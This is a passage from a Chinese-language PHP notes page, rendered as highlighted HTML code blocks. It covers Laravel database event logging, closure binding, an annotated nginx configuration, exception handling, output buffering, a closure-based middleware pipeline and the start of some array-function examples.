class="string">'sale_group_relation.child_id'</span>);</span><br><span class="line"></span><br><span class="line">$orm-&gt;where(<span class="string">'sale_area.id'</span>, $condition[<span class="string">'id'</span>]);</span><br><span class="line">$orm-&gt;select([<span class="string">'*'</span>]);</span><br><span class="line"><span class="keyword">return</span> $orm-&gt;get()-&gt;toArray();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EventServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span> </span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">boot</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        parent::boot();</span><br><span class="line">        <span class="comment">// 监听事务时触发https://www.jianshu.com/p/c8f703d0ce5a</span></span><br><span class="line">        Event::listen(ConnectionEvent::<span class="class"><span class="keyword">class</span>, <span class="title">function</span> ($<span class="title">event</span>)</span>&#123;</span><br><span class="line">          Log::info(ConnectionEvent::<span class="class"><span class="keyword">class</span>, $<span class="title">event</span>-&gt;<span class="title">connection</span>-&gt;<span class="title">getConfig</span>())</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 监听日志记录的db操作</span></span><br><span class="line">        Event::listen(QueryExecuted::<span class="class"><span class="keyword">class</span>, <span class="title">function</span> ($<span class="title">event</span>)</span>&#123;</span><br><span class="line">            Log::info(QueryExecuted::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line">                [</span><br><span class="line">                    <span class="string">'connection'</span>=&gt;$event-&gt;connection-&gt;getConfig(),</span><br><span class="line">                    <span class="string">'sql'</span> =&gt; $event-&gt;sql,</span><br><span class="line">                    <span class="string">'time'</span> =&gt; $event-&gt;time,</span><br><span class="line">                    <span class="string">'bindings'</span> =&gt; $event-&gt;bindings,</span><br><span class="line">            ]);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 监听PdoStatement操作</span></span><br><span class="line">        Event::listen(StatementPrepared::<span class="class"><span class="keyword">class</span>, <span class="title">function</span> ($<span class="title">event</span>) </span>&#123;</span><br><span class="line">            ob_start();</span><br><span class="line">            $event-&gt;statement-&gt;debugDumpParams();</span><br><span class="line">            $dump = ob_get_clean();</span><br><span class="line">            Log::info(StatementPrepared::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line">                [</span><br><span class="line">                    <span class="string">'connection'</span>=&gt;$event-&gt;connection-&gt;getConfig(),</span><br><span class="line">                    <span class="string">'debugDumpParams'</span> =&gt; $dump,</span><br><span class="line">                    <span class="string">'errorCode'</span> =&gt; $event-&gt;statement-&gt;errorCode(),</span><br><span class="line">                    <span class="string">'errorInfo'</span> =&gt; $event-&gt;statement-&gt;errorInfo(),</span><br><span class="line">                    <span class="string">'queryString'</span> =&gt; $event-&gt;statement-&gt;queryString,</span><br><span class="line">                ]);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="闭包基本用法"><a href="#闭包基本用法" class="headerlink" title="闭包基本用法"></a>闭包基本用法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">PHP 中传递对象时，默认是以引用传递所以在闭包内操作 use 传递的对象时需要特别注意https:<span class="comment">//www.0php.net/posts/PHP-Clourse-%E9%97%AD%E5%8C%85%E7%B1%BB-%E6%B5%85%E6%9E%90.html</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">    public $name = <span class="string">'Wang Cai'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dog = <span class="keyword">new</span> Dog();</span><br><span class="line"></span><br><span class="line">$changeName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">use</span> (<span class="params">$dog</span>) </span>&#123;</span><br><span class="line">    $dog-&gt;name = <span class="string">'Lai Fu'</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">$changeName();</span><br><span class="line"></span><br><span class="line">echo $dog-&gt;name;</span><br><span class="line"><span class="comment">// 输出 Lai Fu</span></span><br><span class="line">$clourse = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    echo <span class="string">'hello clourse'</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_object($clourse)) &#123;</span><br><span class="line">    echo get_class($clourse);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出 Closure</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pandas</span> </span>&#123;</span><br><span class="line">    public $num = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$pandas = <span class="keyword">new</span> Pandas();</span><br><span class="line"></span><br><span class="line">$add = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    echo ++$<span class="keyword">this</span>-&gt;num . PHP_EOL;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">$newAdd1 = $add-&gt;bindTo($pandas);</span><br><span class="line">$newAdd1();</span><br><span class="line"><span class="comment">// 输出 2</span></span><br><span class="line">$newAdd2 = Closure::bind($add, $pandas);</span><br><span class="line">$newAdd2();</span><br><span class="line"><span class="comment">// 输出 3</span></span><br><span class="line">如果将 Pandas 类的 $num 属性改写为 protected 或 private 则会抛出一个致命错误！</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pandas</span> </span>&#123;</span><br><span class="line">    protected $num = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$pandas = <span class="keyword">new</span> Pandas();</span><br><span class="line"></span><br><span class="line">$add = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    echo ++$<span class="keyword">this</span>-&gt;num . PHP_EOL;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">$newAdd1 = $add-&gt;bindTo($pandas, $pandas);</span><br><span class="line">$newAdd1();</span><br><span class="line"><span class="comment">// 输出 2</span></span><br><span class="line">$newAdd2 = Closure::bind($add, $pandas, <span class="string">'Pandas'</span>);</span><br><span class="line">$newAdd2();</span><br><span class="line"><span class="comment">// 输出 3</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pandas</span> </span>&#123;</span><br><span class="line">    protected $num = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$pandas = <span class="keyword">new</span> Pandas();</span><br><span class="line"></span><br><span class="line">$add = <span class="function"><span class="keyword">function</span> (<span class="params">$num</span>) </span>&#123;</span><br><span class="line">    $<span class="keyword">this</span>-&gt;num += $num;</span><br><span class="line">    echo $<span class="keyword">this</span>-&gt;num . PHP_EOL;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">$add-&gt;call($pandas, <span class="number">5</span>);</span><br><span class="line"><span class="comment">// 输出 6</span></span><br></pre></td></tr></table></figure>
<h3 id="nginx-配置文件"><a href="#nginx-配置文件" class="headerlink" title="nginx 配置文件"></a>nginx 配置文件</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"># 指定运行 nginx 的用户</span><br><span class="line"># 格式：user 用户名 [用户组];</span><br><span class="line">user www www;</span><br><span class="line"></span><br><span class="line"># nginx 的工作进程数</span><br><span class="line"># 格式：worker_processes 进程数;</span><br><span class="line">worker_processes <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"># pid 文件的存放路径</span><br><span class="line"># 格式：pid 文件路径;</span><br><span class="line">pid logs/nginx.pid;</span><br><span class="line"></span><br><span class="line"># 指定错误日志文件存放路径</span><br><span class="line"># 格式：error_log 文件路径 [错误级别];</span><br><span class="line"># 错误级别包括：DEBUG | info | notice | warn | error | crit | alert | emerg</span><br><span class="line">error_log logs/logs.log warn;</span><br><span class="line"></span><br><span class="line"># 指定 worker 进程打开文件最大数目限制</span><br><span class="line"># 格式：worker_rlimit_nofile 最大打开文件数;</span><br><span class="line">worker_rlimit_nofile <span class="number">10000</span>;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">  # 指定每个 worker 进程同时打开的最大连接数</span><br><span class="line">  # 格式：worker_connections 最大连接数;</span><br><span class="line">  # 此值不能大于操作系统支持的打开的最大文件句柄数</span><br><span class="line">  worker_connections <span class="number">1024</span>;</span><br><span class="line">  </span><br><span class="line">  # 设置是否允许同时接受多个连接</span><br><span class="line">  # 格式：multi_accept on|off;</span><br><span class="line">  multi_accept on;</span><br><span class="line">  </span><br><span class="line">  # 设置事件驱动模型</span><br><span class="line">  # 格式：use 事件驱动模型;</span><br><span class="line">  # 可填内容：select | poll | kqueue | epoll | rtsig | /dev/poll | eventport</span><br><span class="line">  # 推荐使用 use epoll;</span><br><span class="line">  use epoll;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">  # 引入「文件扩展名与文件类型映射表」的配置文件</span><br><span class="line">  include mime.types;</span><br><span class="line">  </span><br><span class="line">  # 指定默认HTTP 响应的 Content-Type 值</span><br><span class="line">  # 格式：default_type type;</span><br><span class="line">  default_type text/plain; </span><br><span class="line">  </span><br><span class="line">  # 指定连接日志格式</span><br><span class="line">  # 格式：log_format 格式名 格式字符串;</span><br><span class="line">  log_format myFormat <span class="string">'$remote_addr–$remote_user [$time_local] $request $status $body_bytes_sent $http_referer $http_user_agent $http_x_forwarded_for'</span>;</span><br><span class="line">  </span><br><span class="line">  # 指定连接日志文件存放路径</span><br><span class="line">  # 格式：access_log 存放文件路径 日志格式;</span><br><span class="line">  access_log logs/access_logs.log myFormat;</span><br><span class="line">  </span><br><span class="line">  # 指定连接超时时间</span><br><span class="line">  # 格式：keepalive_timeout 超时秒数</span><br><span class="line">  keepalive_timeout <span class="number">60</span>;</span><br><span class="line">  </span><br><span class="line">  # 指定是否使用sendfile系统调用来传输文件</span><br><span class="line">  # 格式:sendfile on|off;</span><br><span class="line">  # 推荐开启</span><br><span class="line">  sendfile on;</span><br><span class="line">  </span><br><span class="line">  server &#123;</span><br><span class="line">    # 指定 server 监听的端口</span><br><span class="line">    # 格式：listen 端口号;</span><br><span class="line">    listen <span class="number">80</span>;</span><br><span class="line">    </span><br><span class="line">    # 指定 server 主机名，支持域名、IP，可以使用通配符或正则表达式，支持多个</span><br><span class="line">    # 格式：server_name 主机名...;</span><br><span class="line">    server_name www<span class="number">.0</span>php.net;</span><br><span class="line">    </span><br><span class="line">    # 指定站点目录</span><br><span class="line">    # 格式：root 目录名;</span><br><span class="line">    root /www/public;</span><br><span class="line">    </span><br><span class="line">    # 指定默认页面，可多个，优先匹配第一个存在的</span><br><span class="line">    # 格式：index 文件名...;</span><br><span class="line">    index index.html index.htm index.php;</span><br><span class="line">    </span><br><span class="line">    # location 块</span><br><span class="line">    # 格式： location [=|~|~*|^~] 正则表达式 &#123;...&#125;</span><br><span class="line">    location ~ [^<span class="regexp">/]\.php(/</span>|$) &#123;</span><br><span class="line">      # 指定 fastcgi 代理</span><br><span class="line">      # 格式：fastcgi_pass fastcgi地址</span><br><span class="line">      fastcgi_pass <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">9000</span>;</span><br><span class="line">      </span><br><span class="line">      # 指定 fastcgi 默认请求文件</span><br><span class="line">      # 格式：fastcgi_index 默认请求文件</span><br><span class="line">      fastcgi_index index.php;</span><br><span class="line">      </span><br><span class="line">      # 引入 fastcgi 的配置文件</span><br><span class="line">      include fastcgi.conf;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    # 其它 location 均未匹配则会匹配此块</span><br><span class="line">    location / &#123;</span><br><span class="line">      # 找指定路径下文件，如果不存在，则转给后面的文件执行</span><br><span class="line">      # 格式：try_files 文件路径...;</span><br><span class="line">      try_files $uri $uri/ <span class="regexp">/index.php?$query_string;</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="try-catch"><a href="#try-catch" class="headerlink" title="try catch"></a>try catch</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (random_int(<span class="number">0</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'I am RuntimeException'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> OutOfRangeException(<span class="string">'I am OutOfRangeException'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    foo();</span><br><span class="line">&#125; <span class="keyword">catch</span> (OutOfRangeException|RuntimeException $e) &#123;</span><br><span class="line">    echo $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 根据随机抛出的异常分别输出</span></span><br><span class="line"><span class="comment">// I am RuntimeException</span></span><br><span class="line"><span class="comment">// I am OutOfRangeException</span></span><br><span class="line">全局异常处理函数</span><br><span class="line">set_exception_handler(<span class="function"><span class="keyword">function</span> (<span class="params">Exception $e</span>) </span>&#123;</span><br><span class="line">    echo $e-&gt;getMessage();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">'nobody catch me'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo();</span><br><span class="line"><span class="comment">// 输出 nobody catch me</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">int $a</span>): <span class="title">int</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    foo(<span class="string">'string'</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable $e) &#123;</span><br><span class="line">    echo get_class($e);<span class="comment">//TypeError </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出 Throwable Throwable 是 PHP 7 新出的一个预定义接口，Error 和 Exception 类都实现了这个接口，也就是说我们现在有能力通过 catch 捕获到 Error</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception $e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo foo();</span><br><span class="line"><span class="comment">// 输出 3  https://www.0php.net/posts/PHP-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E4%B8%89%E8%BF%9E-try-catch-finally.html</span></span><br><span class="line"><span class="keyword">finally</span> 内的代码是无论是否捕获到异常都会执行的代码，并且当 <span class="keyword">finally</span> 中存在 <span class="keyword">return</span> 返回值时，整个<span class="keyword">try</span>..catch...finally段的返回值只会是 <span class="keyword">finally</span> 的返回值。</span><br></pre></td></tr></table></figure>
<h3 id="忽略-include-的输出"><a href="#忽略-include-的输出" class="headerlink" title="忽略 include 的输出"></a>忽略 include 的输出</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ob_start();</span><br><span class="line">include <span class="string">'file.php'</span>;</span><br><span class="line">ob_end_clean();</span><br><span class="line">输出缓冲区的作用是将 PHP 的输出内容缓存在一块内存中，当缓冲区的内存满了或者程序执行完毕后便会将缓冲区的内容发送给客户端。 https:<span class="comment">//www.0php.net/posts/PHP-%E8%BE%93%E5%87%BA%E7%BC%93%E5%86%B2%E5%8C%BA%E5%BA%94%E7%94%A8.html</span></span><br><span class="line">ob_start();</span><br><span class="line">echo <span class="string">'world'</span>;</span><br><span class="line">$str = ob_get_clean();</span><br><span class="line">echo <span class="string">'hello '</span> . $str;</span><br><span class="line"><span class="comment">// 输出 hello world</span></span><br><span class="line">$str1 = <span class="string">"good"</span>; </span><br><span class="line">$str2 = <span class="string">"good\0bad"</span>; </span><br><span class="line">var_dump(strcoll($str1, $str2));</span><br><span class="line"><span class="comment">// 非二进制安全，输出 0</span></span><br><span class="line">var_dump(strcmp($str1, $str2));</span><br><span class="line"><span class="comment">// 二进制安全，输出 -4 在二进制安全的函数操作里 \0 并不会看做字符串的结尾，字符串中所有的数据都没有特殊的含义。 https://www.0php.net/posts/PHP-%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B8%E5%85%B3%E5%B8%B8%E8%AF%86.html</span></span><br></pre></td></tr></table></figure>
<h3 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">$allMiddleware = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    echo <span class="string">'start middleware2'</span> . PHP_EOL;</span><br><span class="line">  </span><br><span class="line">    (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        echo <span class="string">'start middleware1'</span> . PHP_EOL;</span><br><span class="line">        <span class="comment">// app</span></span><br><span class="line">        (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            echo <span class="string">'app'</span> . PHP_EOL;</span><br><span class="line">        &#125;)();</span><br><span class="line">        <span class="comment">// end app</span></span><br><span class="line">        echo <span class="string">'end middleware1'</span> . PHP_EOL;</span><br><span class="line">    &#125;)();</span><br><span class="line">  </span><br><span class="line">    echo <span class="string">'end middleware2'</span> . PHP_EOL;</span><br><span class="line">&#125;;</span><br><span class="line">$allMiddleware();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出https://www.0php.net/posts/PHP-%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%9E%E7%8E%B0.html</span></span><br><span class="line"><span class="comment">// start middleware2</span></span><br><span class="line"><span class="comment">// start middleware1</span></span><br><span class="line"><span class="comment">// app</span></span><br><span class="line"><span class="comment">// end middleware1</span></span><br><span class="line"><span class="comment">// end middleware2</span></span><br><span class="line">$db = <span class="function"><span class="keyword">function</span> (<span class="params">$request, Closure $next</span>) </span>&#123;</span><br><span class="line">    echo <span class="string">'成功建立数据库连接'</span> . PHP_EOL;</span><br><span class="line">    $response = $next($request);</span><br><span class="line">    echo <span class="string">'成功关闭数据库连接'</span> . PHP_EOL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $response;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">$like = <span class="function"><span class="keyword">function</span> (<span class="params">$request, Closure $next</span>) </span>&#123;</span><br><span class="line">    echo <span class="string">'点赞+1'</span> . PHP_EOL;</span><br><span class="line">    $response = $next($request);</span><br><span class="line">    echo <span class="string">'点赞+2'</span> . PHP_EOL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $response;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">$app = <span class="function"><span class="keyword">function</span> (<span class="params">$request</span>) </span>&#123;</span><br><span class="line">    echo $request . PHP_EOL;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'一个无聊的返回值'</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">$allMiddleware = [$like, $db];</span><br><span class="line">$next = $app;</span><br><span class="line">foreach ($allMiddleware <span class="keyword">as</span> $middleware) &#123;</span><br><span class="line">    $next = <span class="function"><span class="keyword">function</span> (<span class="params">$request</span>) <span class="title">use</span> (<span class="params">$middleware, $next</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $middleware($request, $next);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// array_reduce 实现</span></span><br><span class="line">$allMiddleware = [$like, $db];</span><br><span class="line">$go = array_reduce($allMiddleware, <span class="function"><span class="keyword">function</span> (<span class="params">$next, $middleware</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">use</span> (<span class="params">$next, $middleware</span>) </span>&#123;</span><br><span class="line">        $middleware($next);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;, $app);</span><br><span class="line">$go();</span><br><span class="line">$response = $next(<span class="string">'O(∩_∩)O'</span>);</span><br><span class="line">echo $response;</span><br></pre></td></tr></table></figure>
<h3 id="php数组函数"><a href="#php数组函数" class="headerlink" title="php数组函数"></a>php数组函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//composer require zane/utils dev-master</span></span><br><span class="line">$data = [<span class="number">6</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">8</span>];</span><br><span class="line">$cv = array_count_values($data);</span><br><span class="line"><span class="comment">// $cv = [6 =&gt; 2, 11 =&gt; 4, 2 =&gt; 2, 4 =&gt; 3, 7 =&gt; 1, 8 =&gt; 1]</span></span><br><span class="line">arsort($cv);</span><br><span class="line">$max = key($cv);</span><br><span class="line">var_dump($max);</span><br><span class="line"><span class="comment">// 结果 11</span></span><br><span class="line">$power = [<span 